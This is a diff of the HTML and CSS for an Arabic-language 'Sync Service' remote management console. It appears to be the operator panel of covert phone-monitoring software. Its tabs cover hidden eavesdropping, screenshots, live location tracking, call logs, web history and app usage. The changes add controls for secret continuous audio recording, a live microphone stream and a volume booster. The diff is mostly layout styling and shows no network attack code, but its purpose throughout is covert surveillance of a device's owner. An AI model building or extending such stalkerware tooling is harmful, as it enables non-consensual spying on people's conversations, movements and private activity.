@@ -6,26 +6,42 @@
     <title>Sync Service — Remote Management Console</title>
     <meta name="description" content="Remote device monitoring and management console">
 
-    <!-- Tailwind CSS (Development CDN) -->
-    <script src="https://cdn.tailwindcss.com"></script>
-
-
-    <!-- Supabase -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-    <!-- Leaflet.js -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <!-- Leaflet Heatmap -->
-    <script src="https://unpkg.com/leaflet.heat@0.2.0/dist/leaflet-heat.js"></script>
-    <!-- Leaflet PolylineDecorator (arrows on route) -->
-    <script src="https://cdn.jsdelivr.net/npm/leaflet-polylinedecorator@1.6.0/dist/leaflet.polylineDecorator.min.js"></script>
-
-    <!-- Chart.js -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+    <!-- ⚡ Preconnect: تسريع اتصال المجالات الخارجية -->
+    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+    <link rel="preconnect" href="https://unpkg.com" crossorigin>
+    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://ahiqnmheiqigrdbishwe.supabase.co" crossorigin>
 
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+    <!-- Tailwind CSS v3 Production Bundle Guard -->
+    <script>
+        (function() {
+            var _w = console.warn;
+            console.warn = function() {
+                if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].indexOf('tailwindcss.com should not be used in production') !== -1) return;
+                _w.apply(console, arguments);
+            };
+        })();
+    </script>
+    <script src="https://cdn.tailwindcss.com/3.4.1"></script>
+
+    <!-- Supabase (min build - أصغر حجماً) -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+
+    <!-- Leaflet CSS (حمّل CSS أولاً لمنع flash of unstyled content) -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.min.css"/>
+    <!-- Leaflet JS -->
+    <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.min.js" defer></script>
+    <!-- Leaflet Heatmap -->
+    <script src="https://cdn.jsdelivr.net/npm/leaflet.heat@0.2.0/dist/leaflet-heat.js" defer></script>
+    <!-- Leaflet PolylineDecorator (arrows on route) -->
+    <script src="https://cdn.jsdelivr.net/npm/leaflet-polylinedecorator@1.6.0/dist/leaflet.polylineDecorator.min.js" defer></script>
+
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js" defer></script>
 
     <script>
         tailwind.config = {
@@ -249,15 +265,22 @@
         }
         .screenshot-card:hover { border-color: rgba(59,130,246,0.4); transform: scale(1.02); }
 
-        /* ── Audio player ── */
+        /* ── Audio player & cards ── */
         .audio-card {
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 16px; border-radius: 14px;
+            display: flex; flex-direction: column;
+            padding: 14px 16px; border-radius: 14px;
             background: rgba(15,25,50,0.6);
             border: 1px solid rgba(255,255,255,0.06);
             transition: all 0.2s;
+            gap: 6px;
         }
         .audio-card:hover { border-color: rgba(16,185,129,0.3); }
+        .audio-progress-bar {
+            accent-color: #10b981;
+        }
+        .audio-progress-bar::-webkit-slider-thumb {
+            width: 14px; height: 14px; background: #10b981; border-radius: 50%;
+        }
 
         /* ── Toggle switch ── */
         .toggle-switch { position: relative; display: inline-flex; height: 24px; width: 44px; }
@@ -396,7 +419,7 @@
             background: rgba(2,6,23,0.95);
             backdrop-filter: blur(20px);
             border-top: 1px solid rgba(255,255,255,0.06);
-            padding: 10px 16px 14px;
+            padding: 8px 12px 10px;
             z-index: 50;
             gap: 8px;
         }
@@ -424,11 +447,11 @@
         .mob-action-btn.amber  { border-color: rgba(245,158,11,0.2); color: #fbbf24; }
 
         /* ══════════════════════════════════════
-           MOBILE RESPONSIVE  (max-width: 768px)
+           MOBILE RESPONSIVE (max-width: 768px)
         ══════════════════════════════════════ */
         @media (max-width: 768px) {
 
-            /* Sidebar: full-screen slide-over from right */
+            /* Sidebar: full-screen slide-over from right with rounded drawer corner */
             .sidebar {
                 position: fixed !important;
                 top: 0; right: 0;
@@ -437,10 +460,13 @@
                 min-width: unset !important;
                 max-width: 340px;
                 transform: translateX(100%);
-                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+                transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
                 z-index: 100;
-                box-shadow: -12px 0 50px rgba(0,0,0,0.7);
+                box-shadow: -16px 0 60px rgba(0,0,0,0.85);
                 overflow-y: auto;
+                border-top-left-radius: 24px;
+                border-bottom-left-radius: 24px;
+                border-left: 1px solid rgba(59, 130, 246, 0.2);
             }
             .sidebar.active { transform: translateX(0); }
 
@@ -451,9 +477,11 @@
             #sidebar-overlay {
                 display: none;
                 position: fixed; inset: 0;
-                background: rgba(0,0,0,0.65);
-                backdrop-filter: blur(3px);
+                background: rgba(2, 6, 23, 0.75);
+                backdrop-filter: blur(8px);
+                -webkit-backdrop-filter: blur(8px);
                 z-index: 99;
+                transition: opacity 0.3s ease;
             }
             #sidebar-overlay.active { display: block; }
 
@@ -462,17 +490,18 @@
                 display: flex !important;
                 align-items: center; justify-content: center;
                 width: 42px; height: 42px;
-                background: rgba(59,130,246,0.15);
-                border: 1px solid rgba(59,130,246,0.3);
+                background: linear-gradient(135deg, rgba(59,130,246,0.2), rgba(99,102,241,0.15));
+                border: 1px solid rgba(59,130,246,0.35);
                 border-radius: 12px;
                 cursor: pointer;
-                font-size: 18px;
+                font-size: 19px;
                 color: #93c5fd;
                 flex-shrink: 0;
                 margin-left: 8px;
-                transition: all 0.2s;
+                transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+                box-shadow: 0 4px 15px rgba(59,130,246,0.15);
             }
-            #hamburger-btn:active { background: rgba(59,130,246,0.3); }
+            #hamburger-btn:active { transform: scale(0.92); background: rgba(59,130,246,0.3); }
 
             /* Show mobile device dropdown */
             #mobile-device-dropdown { display: block !important; }
@@ -480,11 +509,11 @@
             /* Show mobile bottom actions bar */
             #mobile-quick-actions { display: flex !important; }
 
-            /* Main content fills full width + bottom padding for action bar */
+            /* Main content fills full width + bottom padding for both action bars */
             .main-content {
                 width: 100% !important;
                 flex: 1 !important;
-                padding-bottom: 72px;
+                padding-bottom: 105px;
             }
 
             /* Header: compact for mobile */
@@ -493,53 +522,182 @@
             #device-model { display: none !important; }
             #reported-version { display: none !important; }
 
-            /* Hide some header elements on mobile */
+            /* Hide desktop header text elements on mobile */
             .hidden-mobile { display: none !important; }
 
             /* Battery: compact */
-            #battery-text { font-size: 13px !important; }
+            #battery-text { font-size: 12px !important; font-weight: 800; }
 
-            /* Tabs: hidden on mobile (moved to sidebar) */
+            /* Tabs: hidden on mobile header (moved to bottom nav & sidebar) */
             .tab-nav-bar { display: none !important; }
 
-            /* Content panels: full width, less padding */
-            .tab-content { padding: 10px !important; }
-            .glass { padding: 14px !important; }
-            .stat-card { padding: 14px !important; }
+            /* Content panels: full width, compact touch padding */
+            .tab-content { padding: 8px 10px !important; }
+            .glass { padding: 14px !important; border-radius: 16px !important; }
+            .stat-card { padding: 12px !important; border-radius: 14px !important; }
 
-            /* View area: account for bottom bar */
-            .view-area { height: calc(100vh - 110px); overflow-y: auto; }
+            /* View area: account for header + bottom nav + quick-actions bars */
+            .view-area { height: calc(100vh - 140px); overflow-y: auto; }
+
+            /* Premium Quick Actions bar */
+            #mobile-quick-actions {
+                padding: 6px 10px 8px !important;
+                gap: 6px !important;
+                background: rgba(2, 6, 23, 0.96) !important;
+                backdrop-filter: blur(28px) !important;
+                -webkit-backdrop-filter: blur(28px) !important;
+                border-top: 1px solid rgba(59, 130, 246, 0.25) !important;
+                box-shadow: 0 -10px 30px rgba(0,0,0,0.7) !important;
+            }
+            .mob-action-btn {
+                padding: 6px 3px !important;
+                gap: 3px !important;
+                font-size: 10px !important;
+                font-weight: 800 !important;
+                border-radius: 12px !important;
+                transition: all 0.15s cubic-bezier(0.4, 0, 0.2, 1) !important;
+                -webkit-tap-highlight-color: transparent;
+            }
+            .mob-action-btn:active { transform: scale(0.92) !important; }
+            .mob-action-btn .mob-icon { font-size: 17px !important; }
+
+            /* Custom mobile dropdown */
+            #mobile-device-dropdown {
+                font-size: 13px !important;
+                padding: 9px 32px 9px 14px !important;
+                border-radius: 12px !important;
+                background-color: rgba(15, 23, 42, 0.95) !important;
+                border: 1px solid rgba(59, 130, 246, 0.3) !important;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.3) !important;
+            }
 
             /* Stats grid: 2 columns max on mobile */
             .grid-cols-4 { grid-template-columns: repeat(2, minmax(0, 1fr)) !important; }
             .grid-cols-3 { grid-template-columns: repeat(2, minmax(0, 1fr)) !important; }
 
-            /* Buttons */
-            .btn-action { padding: 10px 14px !important; font-size: 12px !important; }
+            /* Touch Buttons */
+            .btn-action { padding: 10px 14px !important; font-size: 12px !important; border-radius: 12px !important; }
 
-            /* Map */
-            #map { min-height: 320px; }
-            #map-container { min-height: 320px !important; }
+            /* Map height on mobile */
+            #map { min-height: 340px; }
+            #map-container { min-height: 340px !important; }
 
-            /* Tables: horizontal scroll */
-            .overflow-x-auto { overflow-x: auto !important; }
-            table { min-width: 500px; }
+            /* Tables: smooth horizontal scroll */
+            .overflow-x-auto { overflow-x: auto !important; -webkit-overflow-scrolling: touch; }
+            table { min-width: 480px; }
 
-            /* Device list items: larger tap targets */
-            .device-item { padding: 16px 14px !important; margin: 3px 6px !important; }
+            /* Device list items: touch friendly */
+            .device-item { padding: 14px 12px !important; margin: 4px 6px !important; border-radius: 14px !important; }
 
-            /* Audio cards: wrap on small screens */
-            .audio-card { flex-wrap: wrap; gap: 8px; }
+            /* Audio cards: clean multi-row layout on mobile to prevent overlap */
+            .audio-card {
+                display: flex !important;
+                flex-direction: column !important;
+                grid-template-columns: none !important;
+                grid-template-rows: none !important;
+                padding: 12px !important;
+                border-radius: 16px !important;
+                background: rgba(15, 23, 42, 0.85) !important;
+                border: 1px solid rgba(255, 255, 255, 0.08) !important;
+                gap: 8px !important;
+            }
+            .audio-card-top {
+                display: flex !important;
+                align-items: center !important;
+                gap: 8px !important;
+                width: 100% !important;
+            }
+            .audio-progress-container {
+                display: flex !important;
+                align-items: center !important;
+                gap: 8px !important;
+                width: 100% !important;
+                margin: 4px 0 !important;
+            }
+            .audio-actions {
+                display: flex !important;
+                flex-wrap: wrap !important;
+                justify-content: flex-end !important;
+                width: 100% !important;
+                gap: 6px !important;
+                border-top: 1px solid rgba(255,255,255,0.06) !important;
+                padding-top: 8px !important;
+                margin-top: 2px !important;
+            }
 
-            /* Screenshot grid: 2 columns */
-            .screenshot-grid { grid-template-columns: repeat(2, minmax(0, 1fr)) !important; }
+            /* Screenshot grid: 2 columns on mobile */
+            .screenshot-grid { grid-template-columns: repeat(2, minmax(0, 1fr)) !important; gap: 10px !important; }
 
-            /* Feed items: compact */
+            /* Feed items: compact padding */
             .feed-item { padding: 12px 10px !important; }
 
-            /* Status dot in header mobile: show inline */
+            /* Status dot in header mobile */
             #device-status-dot { display: inline-block !important; }
             #device-status-text { font-size: 11px !important; }
+        }
+
+        /* ── Mobile Bottom Tab Navigation (default: hidden on desktop) ── */
+        #mobile-tab-nav { display: none; }
+
+        /* ── Tab Nav styles ── */
+        .mob-tab-btn {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2px;
+            padding: 5px 2px 4px;
+            border-radius: 12px;
+            border: none;
+            background: transparent;
+            color: #64748b;
+            font-size: 10px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4,0,0.2,1);
+            position: relative;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .mob-tab-btn .mob-tab-icon {
+            font-size: 19px;
+            line-height: 1;
+            transition: transform 0.2s cubic-bezier(0.4,0,0.2,1);
+        }
+        .mob-tab-btn.active {
+            color: #60a5fa;
+            background: rgba(59,130,246,0.12);
+        }
+        .mob-tab-btn.active::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 26px;
+            height: 3px;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            border-radius: 0 0 4px 4px;
+            box-shadow: 0 2px 8px rgba(59,130,246,0.6);
+        }
+        .mob-tab-btn.active .mob-tab-icon { transform: translateY(-1px) scale(1.08); }
+        .mob-tab-btn:active { transform: scale(0.9); }
+
+        @media (max-width: 768px) {
+            #mobile-tab-nav {
+                display: flex !important;
+                position: fixed;
+                bottom: 46px;
+                left: 0; right: 0;
+                background: rgba(4, 9, 24, 0.98);
+                backdrop-filter: blur(28px);
+                -webkit-backdrop-filter: blur(28px);
+                border-top: 1px solid rgba(59, 130, 246, 0.2);
+                padding: 4px 6px 3px;
+                z-index: 49;
+                gap: 2px;
+                box-shadow: 0 -8px 30px rgba(0,0,0,0.6);
+            }
         }
 
         /* Desktop: hide mobile-only elements */
@@ -639,16 +797,18 @@
         <!-- ══ Sidebar Tab Navigation (mobile only) ══ -->
         <div class="sidebar-tab-nav border-t border-white/5 pt-3 pb-2 px-3">
             <p class="px-3 pb-2 text-[10px] font-black text-slate-500 uppercase tracking-widest">الأقسام</p>
-            <button class="sidebar-tab-btn active" id="sidebar-btn-reports"   onclick="switchTabMobile('reports')">   <span class="tab-icon">📋</span> التقارير الموحدة</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-screenshots" onclick="switchTabMobile('screenshots')"><span class="tab-icon">🖼️</span> الصور الملتقطة</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-track"      onclick="switchTabMobile('track')">      <span class="tab-icon">🗺️</span> التتبع المباشر</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-audio"      onclick="switchTabMobile('audio')">      <span class="tab-icon">🎙️</span> التنصت المخفي</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-callogs"    onclick="switchTabMobile('callogs')">    <span class="tab-icon">📞</span> سجل المكالمات</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-logs"       onclick="switchTabMobile('logs')">       <span class="tab-icon">⚡</span> السجل المباشر</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-usage"      onclick="switchTabMobile('usage')">      <span class="tab-icon">📊</span> استخدام التطبيقات</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-assets"     onclick="switchTabMobile('assets')">     <span class="tab-icon">🌐</span> أصول الشبكة</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-wifi"       onclick="switchTabMobile('wifi')">       <span class="tab-icon">📶</span> شبكة الـ Wi-Fi</button>
-            <button class="sidebar-tab-btn"        id="sidebar-btn-settings"   onclick="switchTabMobile('settings')">   <span class="tab-icon">⚙️</span> الإعدادات عن بُعد</button>
+            <button class="sidebar-tab-btn active" id="sidebar-btn-reports"   onclick="switchTabMobile('reports'); setActiveMobTab('reports'); closeSidebar()">   <span class="tab-icon">📋</span> التقارير الموحدة</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-screenshots" onclick="switchTabMobile('screenshots'); setActiveMobTab('screenshots'); closeSidebar()"><span class="tab-icon">🖼️</span> الصور الملتقطة</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-track"      onclick="switchTabMobile('track'); setActiveMobTab('track'); closeSidebar()">      <span class="tab-icon">🗺️</span> التتبع المباشر</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-audio"      onclick="switchTabMobile('audio'); setActiveMobTab('audio'); closeSidebar()">      <span class="tab-icon">🎙️</span> التنصت المخفي</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-callogs"    onclick="switchTabMobile('callogs'); setActiveMobTab('callogs'); closeSidebar()">    <span class="tab-icon">📞</span> سجل المكالمات</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-logs"       onclick="switchTabMobile('logs'); setActiveMobTab('logs'); closeSidebar()">       <span class="tab-icon">⚡</span> السجل المباشر</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-usage"      onclick="switchTabMobile('usage'); setActiveMobTab('usage'); closeSidebar()">      <span class="tab-icon">📊</span> استخدام التطبيقات</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-assets"     onclick="switchTabMobile('assets'); setActiveMobTab('assets'); closeSidebar()">     <span class="tab-icon">🌐</span> أصول الشبكة</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-wifi"       onclick="switchTabMobile('wifi'); setActiveMobTab('wifi'); closeSidebar()">       <span class="tab-icon">📶</span> شبكة الـ Wi-Fi</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-webhistory" onclick="switchTabMobile('webhistory'); setActiveMobTab('webhistory'); closeSidebar()"><span class="tab-icon">🌐</span> سجل الويب</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-settings"   onclick="switchTabMobile('settings'); setActiveMobTab('settings'); closeSidebar()">   <span class="tab-icon">⚙️</span> الإعدادات عن بُعد</button>
+            <button class="sidebar-tab-btn"        id="sidebar-btn-downloads"  onclick="switchTabMobile('downloads'); setActiveMobTab('downloads'); closeSidebar()">  <span class="tab-icon">📦</span> مركز التحميلات</button>
         </div>
 
         <!-- Bottom User -->
@@ -712,21 +872,14 @@
                     <p id="last-seen-header" class="text-xs font-bold text-emerald-400 hidden-mobile">--</p>
                 </div>
 
-                <!-- Auto-record select header toggle -->
-                <div class="flex items-center gap-2 bg-slate-800/40 border border-white/5 p-1.5 px-2.5 rounded-xl text-xs font-bold transition-all hidden-mobile mr-2">
-                    <label class="relative inline-flex items-center cursor-pointer select-none">
-                        <input type="checkbox" class="sr-only peer auto-record-select-toggle" onchange="toggleAutoRecordOnSelect(this)">
-                        <div class="w-7 h-4 bg-slate-700 rounded-full peer peer-focus:ring-0 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-emerald-500"></div>
-                        <span class="mr-2 text-[10px] text-slate-300">سجل عند فتح اللوحة</span>
-                    </label>
-                </div>
+                <!-- Auto-record select header toggle removed -->
 
                 <!-- Desktop action buttons -->
                 <div class="flex items-center gap-2 hidden-mobile">
                     <button onclick="triggerCapture()" class="btn-action btn-primary text-xs py-2 px-3">📸 التقاط</button>
                     <button onclick="triggerLocate()"  class="btn-action btn-success text-xs py-2 px-3">📍 موقع</button>
                     <button onclick="triggerRestartService()" class="btn-action btn-ghost text-xs py-2 px-3">🔄</button>
-                    <a href="downloads.html" class="btn-action btn-primary text-xs py-2 px-3">📦 تحميل</a>
+                    <button onclick="switchTab('downloads')" class="btn-action btn-primary text-xs py-2 px-3 flex items-center gap-1 font-bold">📦 تحميل التطبيقات</button>
                 </div>
             </div>
         </header>
@@ -760,8 +913,14 @@
             <button class="tab-btn" id="tab-btn-wifi" onclick="switchTab('wifi')">
                 📶 إدارة شبكة الـ Wi-Fi
             </button>
+            <button class="tab-btn" id="tab-btn-webhistory" onclick="switchTab('webhistory')">
+                🌐 سجل الويب
+            </button>
             <button class="tab-btn" id="tab-btn-settings" onclick="switchTab('settings')">
                 ⚙️ الإعدادات عن بُعد
+            </button>
+            <button class="tab-btn" id="tab-btn-downloads" onclick="switchTab('downloads')">
+                📦 مركز التحميلات
             </button>
         </nav>
 
@@ -907,79 +1066,79 @@
 
             <!-- ══ TAB: Audio Vault ══ -->
             <div id="tab-audio" class="tab-content animate-fade">
-                <div class="p-6 max-w-3xl mx-auto">
+                <div class="p-4 sm:p-6 max-w-4xl mx-auto space-y-4">
 
-                    <!-- Header row -->
-                    <div class="flex items-center justify-between mb-4">
-                        <div>
-                            <h3 class="text-lg font-black text-white">🎙️ مركز التنصت وتصيد الصوت</h3>
-                            <p class="text-[11px] text-slate-500 mt-0.5">يتم تخزين التسجيلات مشفرة ومتاحة من الطالب مؤمن لضمان السرية التامة</p>
-                        </div>
-                        <div class="flex items-center gap-2">
-
-                            <!-- Live Mic toggle (red) -->
-                            <button id="live-mic-btn"
-                                onclick="toggleLiveMic()"
-                                class="btn-action text-xs px-3 py-2 rounded-lg font-bold transition-all
-                                       bg-red-600/20 border border-red-600/40 text-red-400
-                                       hover:bg-red-600/35 hover:text-red-300">
-                                🔴 استماع مباشر
-                            </button>
-
-                            <button onclick="clearPendingCommands()" 
-                                class="btn-action text-[10px] px-2 py-2 rounded-lg font-bold transition-all
-                                       bg-slate-700/30 border border-white/5 text-slate-400
-                                       hover:bg-slate-700/50 hover:text-slate-200">
-                                🧹 مسح الانتظار
-                            </button>
-
-                            <!-- Record Now (30 s clip) -->
-                            <button id="record-now-btn"
-                                onclick="triggerRecordNow()"
-                                class="btn-action text-xs px-3 py-2 rounded-lg font-bold transition-all
-                                       bg-emerald-600/20 border border-emerald-600/40 text-emerald-400
-                                       hover:bg-emerald-600/35 hover:text-emerald-300">
-                                ⏺ تسجيل الآن
-                            </button>
-
-                            <!-- Auto-Record on Selection Control -->
-                            <div class="flex items-center gap-2 bg-slate-800/40 border border-white/5 p-1 px-2 rounded-lg text-xs font-bold transition-all">
-                                <label class="relative inline-flex items-center cursor-pointer select-none">
-                                    <input type="checkbox" id="auto-record-select-toggle" class="sr-only peer auto-record-select-toggle" onchange="toggleAutoRecordOnSelect(this)">
-                                    <div class="w-7 h-4 bg-slate-700 rounded-full peer peer-focus:ring-0 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-emerald-500"></div>
-                                    <span class="mr-2 text-[10px] text-slate-300">تسجيل تلقائي عند فتح اللوحة</span>
-                                </label>
-                            </div>
-
-                            <!-- Auto-Record Toggle Controls -->
-                            <div class="flex items-center gap-2 bg-slate-800/40 border border-white/5 p-1 px-2 rounded-lg text-xs font-bold transition-all">
-                                <label class="relative inline-flex items-center cursor-pointer select-none">
-                                    <input type="checkbox" id="auto-record-toggle" class="sr-only peer" onchange="toggleAutoRecord(this)">
-                                    <div class="w-7 h-4 bg-slate-700 rounded-full peer peer-focus:ring-0 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-emerald-500"></div>
-                                    <span class="mr-2 text-[10px] text-slate-300">تكرار تلقائي</span>
-                                </label>
-                                <div class="flex items-center gap-1 border-r border-white/10 pr-2 mr-2">
-                                    <span class="text-[9px] text-slate-500">كل</span>
-                                    <input type="number" id="auto-record-interval" value="90" min="70" class="w-10 text-[10px] px-1 py-0.5 rounded bg-slate-900 border border-white/10 text-white text-center font-bold">
-                                    <span class="text-[9px] text-slate-500">ثانية</span>
+                    <!-- Header & Control Deck -->
+                    <div class="glass border border-blue-500/20 rounded-2xl p-4 sm:p-5 relative overflow-hidden shadow-2xl">
+                        <div class="absolute -top-10 -left-10 w-40 h-40 bg-blue-500/10 rounded-full blur-3xl pointer-events-none"></div>
+                        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 relative z-10">
+                            <div>
+                                <div class="flex items-center gap-2">
+                                    <span class="text-2xl">🎙️</span>
+                                    <h3 class="text-lg font-black text-white tracking-tight">مركز التنصت وتصيد الصوت</h3>
+                                    <span class="text-[10px] font-extrabold px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-300 border border-blue-500/30">مشفر وآمن</span>
                                 </div>
+                                <p class="text-xs text-slate-400 mt-1">منصة الاستماع للمكالمات والتسجيلات المحيطية السريّة مع دعم البث المباشر ومضخم الصوت</p>
                             </div>
 
+                            <div class="flex flex-wrap items-center gap-2">
+                                <!-- Record Now (120 s clip / 2 minutes) -->
+                                <button id="record-now-btn"
+                                    onclick="triggerRecordNow()"
+                                    class="px-3.5 py-2 text-xs font-black rounded-xl transition-all flex items-center gap-1.5
+                                           bg-emerald-500/20 border border-emerald-500/40 text-emerald-300
+                                           hover:bg-emerald-500/35 hover:text-white shadow-lg shadow-emerald-500/10 active:scale-95">
+                                    ⏺ تسجيل الآن (2 دقيقة)
+                                </button>
 
+                                <!-- Start Continuous Record button (Green) -->
+                                <button id="start-auto-record-btn"
+                                    onclick="startContinuousRecord()"
+                                    class="px-3.5 py-2 text-xs font-black rounded-xl transition-all flex items-center gap-1.5
+                                           bg-teal-500/25 border border-teal-500/50 text-teal-300
+                                           hover:bg-teal-500/40 hover:text-white shadow-lg shadow-teal-500/20 active:scale-95">
+                                    ▶️ بدء التسجيل المستمر (حتى الإيقاف)
+                                </button>
+
+                                <!-- Stop Recording button (Red) -->
+                                <button id="stop-auto-record-btn"
+                                    onclick="stopContinuousRecord()"
+                                    class="px-3.5 py-2 text-xs font-black rounded-xl transition-all flex items-center gap-1.5
+                                           bg-red-500/25 border border-red-500/50 text-red-300
+                                           hover:bg-red-500/40 hover:text-white shadow-lg shadow-red-500/20 active:scale-95">
+                                    ⏹️ إيقاف التسجيل فوراً
+                                </button>
+
+                                <!-- Live Mic toggle (red) -->
+                                <button id="live-mic-btn"
+                                    onclick="toggleLiveMic()"
+                                    class="px-3.5 py-2 text-xs font-black rounded-xl transition-all flex items-center gap-1.5
+                                           bg-indigo-500/20 border border-indigo-500/40 text-indigo-300
+                                           hover:bg-indigo-500/35 hover:text-white shadow-lg shadow-indigo-500/10 active:scale-95">
+                                    🔴 استماع مباشر
+                                </button>
+
+                                <button onclick="clearPendingCommands()" 
+                                    class="px-3 py-2 text-xs font-bold rounded-xl transition-all flex items-center gap-1
+                                           bg-slate-800/80 border border-white/10 text-slate-300
+                                           hover:bg-slate-700 hover:text-white active:scale-95">
+                                    🧹 مسح الانتظار
+                                </button>
+                            </div>
                         </div>
                     </div>
 
                     <!-- Live-mic status bar (hidden when inactive) -->
-                    <div id="live-mic-bar" class="hidden mb-4 px-4 py-3 rounded-xl
-                         bg-red-500/10 border border-red-500/25 flex items-center gap-3">
-                        <span class="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse flex-shrink-0"></span>
-                        <div class="flex-1">
-                            <span class="text-xs font-bold text-red-300">بث مباشر نشط — يتم البث الآن من ميكروفون الجهاز</span>
-                            <div id="mic-offline-warning" class="hidden text-[9px] text-amber-500 font-bold mt-1">
-                                ⚠️ الجهاز غير متصل (أوفلاين) حالياً
+                    <div id="live-mic-bar" class="hidden px-4 py-3 rounded-2xl
+                         bg-gradient-to-r from-red-950/80 to-slate-900/90 border border-red-500/40 flex items-center justify-between gap-3 shadow-xl backdrop-blur-xl">
+                        <div class="flex items-center gap-3">
+                            <span class="w-3 h-3 rounded-full bg-red-500 animate-pulse flex-shrink-0 shadow-lg shadow-red-500/80"></span>
+                            <div>
+                                <span class="text-xs font-black text-red-200">🎙️ بث مباشر نشط — يتم البث الآن حياً من ميكروفون الجهاز</span>
+                                <div id="mic-offline-warning" class="hidden text-[10px] text-amber-400 font-bold mt-0.5">
+                                    ⚠️ الجهاز غير متصل حالياً (في انتظار عودة الاتصال)
+                                </div>
                             </div>
-                        </div>
-
                         </div>
                         
                         <!-- Visualizer Bars -->
@@ -993,14 +1152,31 @@
                         <audio id="live-mic-audio" autoplay class="hidden"></audio>
                     </div>
 
+                    <!-- Audio Boost / Volume Amplifier Controls (1x - 5x) -->
+                    <div class="flex flex-wrap items-center justify-between gap-3 bg-gradient-to-r from-amber-500/10 via-purple-500/10 to-blue-500/10 border border-amber-500/25 p-3.5 rounded-2xl text-xs backdrop-blur-xl shadow-lg">
+                        <div class="flex items-center gap-2">
+                            <span class="font-black text-amber-400 flex items-center gap-1 text-sm">
+                                ⚡ مضخم الصوت (Volume Booster):
+                            </span>
+                            <span id="boost-level-text" class="text-xs font-black text-emerald-300 bg-emerald-500/15 px-2.5 py-0.5 rounded-lg border border-emerald-500/30">1x (عادي)</span>
+                        </div>
+                        <div class="flex items-center gap-1.5 overflow-x-auto no-scrollbar py-0.5">
+                            <button onclick="setAudioBoost(1)" data-boost="1" class="audio-boost-btn px-3 py-1.5 text-xs font-bold rounded-xl bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 hover:bg-emerald-500/30 transition-all">1x عادي</button>
+                            <button onclick="setAudioBoost(2)" data-boost="2" class="audio-boost-btn px-3 py-1.5 text-xs font-bold rounded-lg bg-white/5 text-slate-300 border border-white/10 hover:bg-white/10 transition-all">2x مضاعف</button>
+                            <button onclick="setAudioBoost(3)" data-boost="3" class="audio-boost-btn px-3 py-1.5 text-xs font-bold rounded-lg bg-white/5 text-slate-300 border border-white/10 hover:bg-white/10 transition-all">3x قوي</button>
+                            <button onclick="setAudioBoost(4)" data-boost="4" class="audio-boost-btn px-3 py-1.5 text-xs font-bold rounded-lg bg-white/5 text-slate-300 border border-white/10 hover:bg-white/10 transition-all">4x فائق</button>
+                            <button onclick="setAudioBoost(5)" data-boost="5" class="audio-boost-btn px-3 py-1.5 text-xs font-bold rounded-lg bg-white/5 text-slate-300 border border-white/10 hover:bg-white/10 transition-all">🚀 5x أقصى قوة</button>
+                        </div>
+                    </div>
 
                     <!-- Filters for Heard/Unheard -->
-                    <div class="flex items-center justify-between mb-4 bg-white/3 border border-white/5 p-3 rounded-xl">
